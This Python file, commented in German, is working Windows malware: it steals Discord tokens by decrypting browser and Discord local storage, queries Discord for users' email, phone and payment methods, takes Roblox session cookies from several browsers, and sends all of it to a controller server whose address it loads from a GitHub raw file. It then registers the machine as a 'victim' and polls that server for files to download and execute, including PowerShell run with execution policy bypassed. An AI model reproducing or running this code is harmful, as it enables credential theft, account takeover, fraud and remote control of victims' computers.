# Vereinfachter Client – nur Download + Execution
# Läuft nur unter Windows

import os
if os.name != "nt":
    exit()

import subprocess
import sys
import json
import urllib.request
import re
import base64
import datetime
import socket
import time
import threading
import requests
import tempfile
import getpass
import platform

# ========== PAKETE INSTALLIEREN ==========
required_packages = [
    ("win32crypt", "pypiwin32"),
    ("Crypto.Cipher", "pycryptodome"),
    ("browser_cookie3", "browser-cookie3"),
    ("requests", "requests")
]

for module, pip_name in required_packages:
    try:
        __import__(module.replace("-", "_"))
    except ImportError:
        subprocess.check_call([sys.executable, "-m", "pip", "install", pip_name],
                              stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        os.execl(sys.executable, sys.executable, *sys.argv)

import win32crypt
from Crypto.Cipher import AES
import browser_cookie3 as bc

# ========== CONTROLLER-URL VON GITHUB LADEN ==========
GITHUB_RAW_URL = "https://raw.githubusercontent.com/NyveXgg/refdgdfsgdffdsfdsfdsfdgdfsgfs68658fasd865f7568a6sd657586das56dsa5f678d758a7dfgerergrefdgfdgdfgfdfdgs/refs/heads/main/Controller.raw"
CONTROLLER_URL = None   # z.B. http://51.75.118.149:20144/api/receive
BASE_URL = None         # z.B. http://51.75.118.149:20144

def get_controller_url():
    global CONTROLLER_URL, BASE_URL
    try:
        with urllib.request.urlopen(GITHUB_RAW_URL) as response:
            full_url = response.read().decode().strip()
            # Entferne /api/receive am Ende, falls vorhanden
            if full_url.endswith('/api/receive'):
                BASE_URL = full_url[:-len('/api/receive')]
            else:
                BASE_URL = full_url
            CONTROLLER_URL = full_url
            print(f"[+] Controller-URL geladen: {CONTROLLER_URL}")
            print(f"[+] Basis-URL für Befehle: {BASE_URL}")
    except Exception as e:
        print(f"[-] Fehler beim Laden der Controller-URL: {e}")
        CONTROLLER_URL = None
        BASE_URL = None

get_controller_url()

# ========== HILFSFUNKTIONEN ==========
def get_ip():
    try:
        with urllib.request.urlopen("https://api.ipify.org?format=json", timeout=5) as response:
            return json.loads(response.read().decode()).get("ip")
    except:
        return "Unknown"

def send_to_controller(data):
    if not CONTROLLER_URL:
        print("[-] Keine Controller-URL, sende nicht.")
        return
    try:
        req = urllib.request.Request(
            CONTROLLER_URL,
            data=json.dumps(data).encode('utf-8'),
            headers={'Content-Type': 'application/json'},
            method='POST'
        )
        urllib.request.urlopen(req, timeout=5)
        print(f"[+] Daten an Controller gesendet ({len(data)} Einträge)")
    except Exception as e:
        print(f"[-] Fehler beim Senden: {e}")

# ========== DISCORD-TOKEN EXTRAKTION ==========
LOCAL = os.getenv("LOCALAPPDATA")
ROAMING = os.getenv("APPDATA")
PATHS = {
    'Discord': ROAMING + '\\discord',
    'Discord Canary': ROAMING + '\\discordcanary',
    'Lightcord': ROAMING + '\\Lightcord',
    'Discord PTB': ROAMING + '\\discordptb',
    'Opera': ROAMING + '\\Opera Software\\Opera Stable',
    'Opera GX': ROAMING + '\\Opera Software\\Opera GX Stable',
    'Amigo': LOCAL + '\\Amigo\\User Data',
    'Torch': LOCAL + '\\Torch\\User Data',
    'Kometa': LOCAL + '\\Kometa\\User Data',
    'Orbitum': LOCAL + '\\Orbitum\\User Data',
    'CentBrowser': LOCAL + '\\CentBrowser\\User Data',
    '7Star': LOCAL + '\\7Star\\7Star\\User Data',
    'Sputnik': LOCAL + '\\Sputnik\\Sputnik\\User Data',
    'Vivaldi': LOCAL + '\\Vivaldi\\User Data\\Default',
    'Chrome SxS': LOCAL + '\\Google\\Chrome SxS\\User Data',
    'Chrome': LOCAL + "\\Google\\Chrome\\User Data\\Default",
    'Epic Privacy Browser': LOCAL + '\\Epic Privacy Browser\\User Data',
    'Microsoft Edge': LOCAL + '\\Microsoft\\Edge\\User Data\\Default',
    'Uran': LOCAL + '\\uCozMedia\\Uran\\User Data\\Default',
    'Yandex': LOCAL + '\\Yandex\\YandexBrowser\\User Data\\Default',
    'Brave': LOCAL + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
    'Iridium': LOCAL + '\\Iridium\\User Data\\Default'
}

def getheaders(token=None):
    headers = {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36"
    }
    if token:
        headers.update({"Authorization": token})
    return headers

def gettokens(path):
    path += "\\Local Storage\\leveldb\\"
    tokens = []
    if not os.path.exists(path):
        return tokens
    for file in os.listdir(path):
        if not file.endswith(".ldb") and not file.endswith(".log"):
            continue
        try:
            with open(f"{path}{file}", "r", errors="ignore") as f:
                for line in (x.strip() for x in f.readlines()):
                    for values in re.findall(r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*", line):
                        tokens.append(values)
        except PermissionError:
            continue
    return tokens

def getkey(path):
    with open(path + "\\Local State", "r") as file:
        key = json.loads(file.read())['os_crypt']['encrypted_key']
    return key

def collect_discord_tokens():
    checked = []
    all_tokens_data = []
    ip = get_ip()
    for platform, path in PATHS.items():
        if not os.path.exists(path):
            continue
        for token in gettokens(path):
            token = token.replace("\\", "") if token.endswith("\\") else token
            try:
                token = AES.new(
                    win32crypt.CryptUnprotectData(base64.b64decode(getkey(path))[5:], None, None, None, 0)[1],
                    AES.MODE_GCM,
                    base64.b64decode(token.split('dQw4w9WgXcQ:')[1])[3:15]
                ).decrypt(base64.b64decode(token.split('dQw4w9WgXcQ:')[1])[15:])[:-16].decode()
                if token in checked:
                    continue
                checked.append(token)

                res = urllib.request.urlopen(urllib.request.Request('https://discord.com/api/v10/users/@me', headers=getheaders(token)))
                if res.getcode() != 200:
                    continue
                res_json = json.loads(res.read().decode())

                params = urllib.parse.urlencode({"with_counts": True})
                res = json.loads(urllib.request.urlopen(urllib.request.Request(f'https://discordapp.com/api/v6/users/@me/guilds?{params}', headers=getheaders(token))).read().decode())
                guilds = len(res)
                guild_infos = ""
                for guild in res:
                    if guild['permissions'] & 8 or guild['permissions'] & 32:
                        res_g = json.loads(urllib.request.urlopen(urllib.request.Request(f'https://discordapp.com/api/v6/guilds/{guild["id"]}', headers=getheaders(token))).read().decode())
                        vanity = f"""; .gg/{res_g["vanity_url_code"]}""" if res_g["vanity_url_code"] else ""
                        guild_infos += f"\nㅤ- [{guild['name']}]: {guild['approximate_member_count']}{vanity}"
                if guild_infos == "":
                    guild_infos = "No guilds"

                res = json.loads(urllib.request.urlopen(urllib.request.Request('https://discordapp.com/api/v6/users/@me/billing/subscriptions', headers=getheaders(token))).read().decode())
                has_nitro = bool(len(res) > 0)
                exp_date = None
                if has_nitro:
                    exp_date = datetime.datetime.strptime(res[0]["current_period_end"], "%Y-%m-%dT%H:%M:%S.%f%z").strftime('%d/%m/%Y at %H:%M:%S')

                res = json.loads(urllib.request.urlopen(urllib.request.Request('https://discord.com/api/v9/users/@me/guilds/premium/subscription-slots', headers=getheaders(token))).read().decode())
                available = 0
                print_boost = ""
                boost = False
                for id in res:
                    cooldown = datetime.datetime.strptime(id["cooldown_ends_at"], "%Y-%m-%dT%H:%M:%S.%f%z")
                    if cooldown - datetime.datetime.now(datetime.timezone.utc) < datetime.timedelta(seconds=0):
                        print_boost += "ㅤ- Available now\n"
                        available += 1
                    else:
                        print_boost += f"ㅤ- Available on {cooldown.strftime('%d/%m/%Y at %H:%M:%S')}\n"
                    boost = True

                payment_methods = 0
                type_str = ""
                valid = 0
                for x in json.loads(urllib.request.urlopen(urllib.request.Request('https://discordapp.com/api/v6/users/@me/billing/payment-sources', headers=getheaders(token))).read().decode()):
                    if x['type'] == 1:
                        type_str += "CreditCard "
                        if not x['invalid']:
                            valid += 1
                        payment_methods += 1
                    elif x['type'] == 2:
                        type_str += "PayPal "
                        if not x['invalid']:
                            valid += 1
                        payment_methods += 1

                token_data = {
                    'platform': 'discord',
                    'username': res_json['username'],
                    'user_id': res_json['id'],
                    'email': res_json['email'],
                    'phone': res_json['phone'],
                    'guilds': guilds,
                    'admin_guilds': guild_infos,
                    'mfa': res_json['mfa_enabled'],
                    'flags': res_json['flags'],
                    'locale': res_json['locale'],
                    'verified': res_json['verified'],
                    'has_nitro': has_nitro,
                    'nitro_exp': exp_date,
                    'boosts': available,
                    'boost_info': print_boost,
                    'payment_methods': payment_methods,
                    'valid_payments': valid,
                    'payment_types': type_str,
                    'ip': ip,
                    'pc_user': os.getenv("UserName"),
                    'pc_name': os.getenv("COMPUTERNAME"),
                    'source': platform,
                    'token': token,
                    'avatar': f"https://cdn.discordapp.com/avatars/{res_json['id']}/{res_json['avatar']}.png",
                    'timestamp': time.time()
                }
                all_tokens_data.append(token_data)
                print(f"[Discord] Token für {res_json['username']} gefunden")
            except Exception:
                continue
    return all_tokens_data

# ========== ROBLOX-COOKIE EXTRAKTION ==========
def get_roblox_user(cookie):
    try:
        session = requests.Session()
        session.cookies.set('.ROBLOSECURITY', cookie, domain='.roblox.com')
        response = session.get('https://users.roblox.com/v1/users/authenticated', timeout=5)
        if response.status_code == 200:
            data = response.json()
            return {
                'user_id': data['id'],
                'username': data['name'],
                'avatar': f"https://www.roblox.com/headshot-thumbnail/image?userId={data['id']}&width=50&height=50"
            }
    except:
        pass
    return {'user_id': None, 'username': 'Unknown', 'avatar': None}

def collect_roblox_cookies():
    all_cookies_data = []
    ip = get_ip()
    browser_functions = [
        ("Chrome", bc.chrome),
        ("Firefox", bc.firefox),
        ("Opera", bc.opera),
        ("Edge", bc.edge),
        ("Chromium", bc.chromium),
        ("Brave", bc.brave)
    ]
    for browser_name, browser_func in browser_functions:
        try:
            cookies = browser_func(domain_name='roblox.com')
            for c in cookies:
                if c.name == '.ROBLOSECURITY':
                    user_info = get_roblox_user(c.value)
                    cookie_data = {
                        'platform': 'roblox',
                        'cookie': c.value,
                        'username': user_info['username'],
                        'user_id': user_info['user_id'],
                        'avatar': user_info['avatar'],
                        'ip': ip,
                        'pc_user': os.getenv("UserName"),
                        'pc_name': os.getenv("COMPUTERNAME"),
                        'source': f'Roblox ({browser_name})',
                        'timestamp': time.time()
                    }
                    all_cookies_data.append(cookie_data)
                    print(f"[Roblox] Cookie für {user_info['username']} gefunden ({browser_name})")
                    break
        except Exception:
            continue
    return all_cookies_data

# ========== DOWNLOAD-CLIENT (OHNE RAT) ==========
VICTIM_ID = socket.gethostname() + "_" + getpass.getuser()

class DownloadClient:
    def __init__(self, base_url):
        self.base_url = base_url.rstrip('/')
        self.victim_id = VICTIM_ID
        self.poll_interval = 5

    def register(self):
        try:
            data = {
                'victim_id': self.victim_id,
                'hostname': socket.gethostname(),
                'user': getpass.getuser(),
                'os': platform.platform(),
                'ip': get_ip()
            }
            requests.post(f"{self.base_url}/api/rat/register", json=data, timeout=5)
            print("[Client] Registriert")
        except Exception as e:
            print(f"[Client] Registrierung fehlgeschlagen: {e}")

    def poll(self):
        while True:
            try:
                resp = requests.get(f"{self.base_url}/api/rat/poll/{self.victim_id}", timeout=10)
                if resp.status_code == 200:
                    cmd = resp.json()
                    if cmd and cmd.get('type') == 'download':
                        self.execute_download(cmd)
            except Exception as e:
                print(f"[Client] Poll-Fehler: {e}")
            time.sleep(self.poll_interval)

    def execute_download(self, cmd):
        url = cmd.get('url')
        ext = cmd.get('extension', '.exe')
        cmd_id = cmd.get('id')
        print(f"[Client] Download von {url} als {ext}")
        result = self.download_and_execute(url, ext)
        try:
            requests.post(f"{self.base_url}/api/rat/result/{self.victim_id}",
                          json={'id': cmd_id, 'result': result}, timeout=5)
        except Exception as e:
            print(f"[Client] Ergebnis senden fehlgeschlagen: {e}")

    def download_and_execute(self, url, file_extension='.exe'):
        try:
            response = requests.get(url, timeout=30)
            response.raise_for_status()
            raw_data = response.content
            temp_file = tempfile.NamedTemporaryFile(suffix=file_extension, delete=False)
            temp_path = temp_file.name
            temp_file.write(raw_data)
            temp_file.close()
            if platform.system() == 'Windows':
                if file_extension == '.py':
                    subprocess.Popen(['python', temp_path], shell=True, stdin=None, stdout=None, stderr=None, close_fds=True)
                elif file_extension == '.ps1':
                    subprocess.Popen(['powershell', '-ExecutionPolicy', 'Bypass', '-File', temp_path], shell=True, stdin=None, stdout=None, stderr=None, close_fds=True)
                elif file_extension in ['.bat', '.cmd']:
                    subprocess.Popen(temp_path, shell=True, stdin=None, stdout=None, stderr=None, close_fds=True)
                else:
                    subprocess.Popen(temp_path, shell=True, stdin=None, stdout=None, stderr=None, close_fds=True)
            else:
                os.chmod(temp_path, 0o755)
                subprocess.Popen(['bash', temp_path] if file_extension == '.sh' else temp_path, shell=True, stdin=None, stdout=None, stderr=None, close_fds=True)
            return f"SUCCESS: Downloaded and executed {url} as {file_extension}"
        except Exception as e:
            return f"ERROR: {str(e)}"

# ========== HAUPTFUNKTION ==========
def main():
    if not CONTROLLER_URL or not BASE_URL:
        print("[-] Keine gültige Controller-URL verfügbar. Skript wird beendet.")
        return

    # 1. Discord- und Roblox-Daten sammeln (parallel)
    discord_data = []
    roblox_data = []

    def run_discord():
        nonlocal discord_data
        discord_data = collect_discord_tokens()

    def run_roblox():
        nonlocal roblox_data
        roblox_data = collect_roblox_cookies()

    t1 = threading.Thread(target=run_discord)
    t2 = threading.Thread(target=run_roblox)
    t1.start()
    t2.start()
    t1.join()
    t2.join()

    all_data = discord_data + roblox_data
    if all_data:
        send_to_controller(all_data)
        print(f"[+] Insgesamt {len(all_data)} Einträge gesendet.")
    else:
        print("[-] Keine Daten gefunden.")

    # 2. Download-Client starten
    print("[+] Starte Download-Client...")
    client = DownloadClient(BASE_URL)
    client.register()
    client.poll()  # blockiert

if __name__ == "__main__":
    main()
